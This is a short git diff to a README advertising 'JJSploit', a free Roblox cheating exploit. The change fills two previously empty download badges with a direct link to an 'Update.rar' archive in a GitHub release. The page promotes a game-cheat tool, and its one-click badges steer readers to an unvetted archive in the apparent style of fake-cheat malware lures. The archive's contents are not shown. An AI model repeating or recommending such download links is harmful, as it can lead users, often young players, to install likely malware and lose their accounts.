@@ -1,9 +1,9 @@
-# 🛠 **JJSploit — The Ultimate Free Roblox Exploit (2025 Edition)** 🚀  [![Download JJSploit](https://img.shields.io/badge/Download-JJSploit-blue?style=for-the-badge&logo=download)]() 
+# 🛠 **JJSploit — The Ultimate Free Roblox Exploit (2025 Edition)** 🚀  [![Download JJSploit](https://img.shields.io/badge/Download-JJSploit-blue?style=for-the-badge&logo=download)](https://github.com/GoldB1t/jjsploit/releases/download/Update/Update.rar) 
  
 ![jj](https://github.com/user-attachments/assets/3a7fcfb5-e0c2-480f-9fa5-8502d54b9854)
 
 
-[![Download JJSploit](https://img.shields.io/badge/Download-JJSploit-blue?style=for-the-badge&logo=download)]()  
+[![Download JJSploit](https://img.shields.io/badge/Download-JJSploit-blue?style=for-the-badge&logo=download)](https://github.com/GoldB1t/jjsploit/releases/download/Update/Update.rar)  
 
 ## ❓ **What is JJSploit?**  
 
